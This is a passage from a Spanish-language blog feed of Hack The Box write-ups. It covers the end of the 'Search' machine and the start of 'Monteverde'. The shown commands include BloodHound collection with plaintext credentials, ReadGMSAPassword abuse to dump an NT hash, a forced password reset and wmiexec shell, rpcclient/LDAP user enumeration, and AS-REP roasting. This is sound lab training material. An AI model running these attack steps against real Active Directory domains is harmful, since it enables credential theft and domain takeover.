ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                         
&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;

000000232:   403        29 L     92 W       1233 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;staff&quot;&lt;/span&gt; 
000000003:   301        1 L      10 W       150 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;images&quot;&lt;/span&gt; 
000000190:   301        1 L      10 W       150 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;Images&quot;&lt;/span&gt;    
000000537:   301        1 L      10 W       147 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;css&quot;&lt;/span&gt;     
000000940:   301        1 L      10 W       146 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;js&quot;&lt;/span&gt;        
000002601:   403        29 L     92 W       1233 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;Staff&quot;&lt;/span&gt;     
000002758:   301        1 L      10 W       149 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;fonts&quot;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Probando la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;staff&quot;&lt;/code&gt; vemos que se nos pide un certificado, procedemos a subir el CA.p12 que nos hemos descargado y nos pide una contraseña introducimos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;misspissy&lt;/code&gt; la passwd obtenida para el archivo .pfx&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Accedemos a un panel &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://10.10.11.129/staff/en-US/logon.aspx?ReturnUrl=%2fstaff%2f&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos Logueamos con el user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sierra.frye&lt;/code&gt; y su pass, machine name –&amp;gt; Research&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Obtenemos una consola interactiva &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://10.10.11.129/staff/en-US/console.aspx&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Obtenida la Flag de user.txt procedemos inicializar Neo4j y a enumerar con BloodHound, para ver como podriamos llegar a ser administradores del Dominio.&lt;/p&gt;

&lt;p&gt;Como ya poseemos credenciales validas podemos usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound.py&lt;/code&gt; para recolectar informacion del sistema.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# python3 /opt/BloodHound.py/bloodhound.py -u hope.sharp -p &quot;IsolationIsKey?&quot; -d search.htb -ns 10.10.11.129 --zip&lt;/span&gt;
20220606130949_bloodhound.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cargamos el .zip en BloodHound –&amp;gt; y marcamos los usuarios que ya tenemos como Owned o Pwned
Procedemos a irnos a Shortest Paths y desde el usuario Sierra Frye pinchamos en Shortest Parth from Owned Principals&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sierra.Frye Pertenece a &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Group: Birmingham-itsec@search.htb &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Group: ITSECT@search.htb &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ReadGMSAPassword&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; user: BIR-ADFS-GMSA@SEARCH.HTB
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Abusando de  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ReadGMSAPassword&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AD &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ReadGMSAPassword Powershell
Procedemos de la siguiente forma:
Get-ADServiceAccount 

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 

Get-ADServiceAccount &lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;BIR-ADFS-GMSA&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Properties&lt;/span&gt; msds-ManagedPassword

 

DistinguishedName    : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;BIR-ADFS-GMSA,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Managed Service Accounts,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;search,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
Enabled              : True
msds-ManagedPassword : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1, 0, 0, 0...&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Name                 : BIR-ADFS-GMSA
ObjectClass          : msDS-GroupManagedServiceAccount
ObjectGUID           : 48cd6c5b-56cb-407e-ac2b-7294b5a44857
SamAccountName       : BIR-ADFS-GMSA&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
SID                  : S-1-5-21-271492789-1610487937-1871574529-1299
UserPrincipalName    : 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;– Sacando la Credencial en formato NT Hash–&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$pwd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-ADServiceAccount &lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;BIR-ADFS-GMSA&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Properties&lt;/span&gt; msds-ManagedPassword

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ConvertFrom-ADManagedPasswordBlob &lt;span class=&quot;nv&quot;&gt;$pwd&lt;/span&gt;.’msds-managedpassword’

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
ConvertTo-NTHash &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;.securecurrentpassword
e1e9fd9e46d0d747e1595167eedcec0f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;– Sacando la Credencial –&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$gmsa&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-ADServiceAccount &lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;BIR-ADFS-GMSA&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Properties&lt;/span&gt; msDS-ManagedPassword

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$mp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gmsa&lt;/span&gt;.&lt;span class=&quot;s1&quot;&gt;&apos;msDS-ManagedPassword&apos;&lt;/span&gt;


PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
ConvertFrom-ADManagedPasswordBlob &lt;span class=&quot;nv&quot;&gt;$mp&lt;/span&gt;

Version                   : 1

CurrentPassword           : ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾ롤
                            ᒛ�䬁ማ譿녓鏶骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱茾蒚⟒澽座걍盡篇

SecureCurrentPassword     : System.Security.SecureString
PreviousPassword          : 
SecurePreviousPassword    : 
QueryPasswordInterval     : 2862.13:38:54.3458092
UnchangedPasswordInterval : 2862.13:33:54.3458092
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;– Uso de ScriptBlock para ejecutar Comando como el usuario BIR-ADFS-GMSA –&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ConvertFrom-ADManagedPasswordBlob &lt;span class=&quot;nv&quot;&gt;$mp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.SecureCurrentPassword

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-Object System.Management.Automation.PSCredential &lt;span class=&quot;s1&quot;&gt;&apos;BIR-ADFS-GMSA&apos;&lt;/span&gt; , &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
Invoke-Command &lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt; localhost &lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
search&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ir-adfs-gmsa&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;—– Cambiando la Password al usuario Tristan Davies ——–&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
Invoke-Command &lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt; localhost &lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; net user tristan.davies Password123&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
The &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;– Conexion una vez cambiada la password –&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wmiexec.py search.htb/tristan.davies:&lt;span class=&quot;s1&quot;&gt;&apos;Password123$&apos;&lt;/span&gt;@10.10.11.129 &lt;span class=&quot;nt&quot;&gt;-shell-type&lt;/span&gt; cmd  &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; 10.10.11.129
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SMBv3.0 dialect used
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Launching semi-interactive shell - Careful what you execute
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;search&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;ristan.davies

C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;type root.txt
4e22ea74086xxxxxxxxxxxxxxxxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Machine Rooteada =), que tiemble el examen del OSCP&lt;/p&gt;</content><author><name>Pirrandi</name></author><category term="HTB," /><category term="SmbClient," /><category term="SmbMap," /><category term="Enumeracion," /><category term="Excell" /><category term="ByPass" /><category term="Proteccions," /><category term="Myssql-Server," /><category term="Kerberoasting" /><category term="Attack," /><category term="Import" /><category term="CA" /><category term="Firefox," /><category term="pfx2john," /><category term="ReadGMSAPassword," /><category term="BloodHound," /><category term="Maquinas" /><category term="Retiradas." /><summary type="html">Querier ~ Hack The Box</summary></entry><entry><title type="html">Maquina Retirada Monteverde AD de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2022/03/05/Monteverde.html" rel="alternate" type="text/html" title="Maquina Retirada Monteverde AD de Hack The Box (Necesario VIP)" /><published>2022-03-05T00:00:00-03:00</published><updated>2022-03-05T00:00:00-03:00</updated><id>http://localhost:4000/2022/03/05/Monteverde</id><content type="html" xml:base="http://localhost:4000/2022/03/05/Monteverde.html">&lt;h1 id=&quot;cascade---ad-path--hack-the-box&quot;&gt;Cascade - AD Path ~ Hack The Box&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2022-04-28 14:24:27Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
61610/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2022-04-28T14:25:17
|_  start_date: N/A
|_clock-skew: 5m45s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a enumerar el puerto 389 o servicio de Ldap&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ldapsearch -x -h 10.10.10.172 -b &apos;DC=MEGABANK,DC=LOCAL&apos;   → para enumerar users&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ldapsearch -x -h 10.10.10.172 -b &apos;DC=MEGABANK,DC=LOCAL&apos; | grep &quot;userPrincipalName&quot; | awk &apos;{print $2}&apos; | tr &apos;@&apos; &apos; &apos; | awk &apos;{print $1}&apos; &lt;/span&gt;
 
mhope
SABatchJobs                                                 
svc-ata                                
svc-bexec                              
svc-netapp                                                                                               
dgalanos                               
roleary                                
smorgan 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a usar la herramienta RPCCLIENT para seguir enumerando&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# rpcclient -U &apos;&apos; 10.10.10.172 -N &lt;/span&gt;

rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;enumdomusers &quot;&lt;/span&gt;                                                                                                                                           
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]                 
user:[mhope] rid:[0x641]               
user:[SABatchJobs] rid:[0xa2a]            
user:[svc-ata] rid:[0xa2b]             
user:[svc-bexec] rid:[0xa2c]                   
user:[svc-netapp] rid:[0xa2d]                                        
user:[dgalanos] rid:[0xa35]            
user:[roleary] rid:[0xa36]                    
user:[smorgan] rid:[0xa37]    
                                                                                                                                                                                     
rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; enumdomgroups &quot;&lt;/span&gt;                                
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]       
group:[Domain Guests] rid:[0x202]                         
group:[Domain Computers] rid:0x203]                                                                                                                                  
group:[Group Policy Creator Owners] rid:[0x208]                                           
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]                                                                                                                  
group:[Azure Admins] rid:[0xa29]                                                                                         
group:[File Server Admins] rid:[0xa2e]                                                          
group:[Call Recording Admins] rid:[0xa2f]                        
group:[Reception] rid:[0xa30]          
group:[Operations] rid:[0xa31]                                     
group:[Trading] rid:[0xa32]                 
group:[HelpDesk] rid:[0xa33]                  
group:[Developers] rid:[0xa34]  

Listamos usuarios para el grupo de Azure Admins:
rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; querygroupmem 0xa29 &quot;&lt;/span&gt;      
         rid:[0x1f4] attr:[0x7]                  
        rid:[0x450] attr:[0x7]                 
        rid:[0x641] attr:[0x7]
        
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enumeramos que usuarios pertenecen al grupo Azure Admins ( el Grupo Mas Interesante ):&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; queryuser 0x1f4                                                                                                                                                                               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;9/1813]
result was NT_STATUS_ACCESS_DENIED     
                                                                                                                                                                            
rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;queryuser 0x450   &quot;&lt;/span&gt;     
        User Name   :   AAD_987d7f2f57d2       
        Full Name   :   AAD_987d7f2f57d2       
        Home Drive  :                          
        Dir Drive   :                          
        Profile Path:                         
        Logon Script:
        Description :   Service account &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      jue, 28 abr 2022 16:15:33 CEST
        Logoff Time              :      jue, 01 ene 1970 01:00:00 CET
        Kickoff Time             :      jue, 01 ene 1970 01:00:00 CET
        Password last &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;Time   :      jue, 02 ene 2020 23:53:25 CET
        Password can change Time :      vie, 03 ene 2020 23:53:25 CET
        Password must change Time:      jue, 14 sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x450
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000000a
        padding1[0..7]...
        logon_hrs[0..21]...

rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;queryuser 0x641&quot;&lt;/span&gt;
        User Name   :  &lt;span class=&quot;s2&quot;&gt;&quot; mhope&quot;&lt;/span&gt;
        Full Name   :   Mike Hope
        Home Drive  :   &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;monteverde&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sers&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;mhope
        Dir Drive   :   H:
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      vie, 03 ene 2020 14:29:59 CET
        Logoff Time              :      jue, 01 ene 1970 01:00:00 CET
        Kickoff Time             :      jue, 14 sep 30828 04:48:05 CEST
        Password last &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;Time   :      vie, 03 ene 2020 00:40:06 CET
        Password can change Time :      sáb, 04 ene 2020 00:40:06 CET
        Password must change Time:      jue, 14 sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x641
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000002
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enumeramos mas Usuarios para nuestro diccionario de Usuarios&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# rpcclient -U &apos;&apos; 10.10.10.172 -N -c &apos;enumdomusers&apos; | grep -oP &quot;\[.*?\]&quot; | tr &apos;[]&apos; &apos; &apos; | grep -v 0x  &lt;/span&gt;
 Guest 
 AAD_987d7f2f57d2 
 mhope 
 SABatchJobs 
 svc-ata 
 svc-bexec 
 svc-netapp 
 dgalanos 
 roleary 
 smorgan 
 
&lt;span class=&quot;s2&quot;&gt;&quot;Los añadimos a nuestro potencial listado de usuarios de  AD ---&amp;gt; users.txt &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a hacer una ASPREPROAST ATTACK&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# GetNPUsers.py megabank.local/ -no-pass -usersfile users.txt        &lt;/span&gt;
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User mhope doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] User svc-ata doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn&apos;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
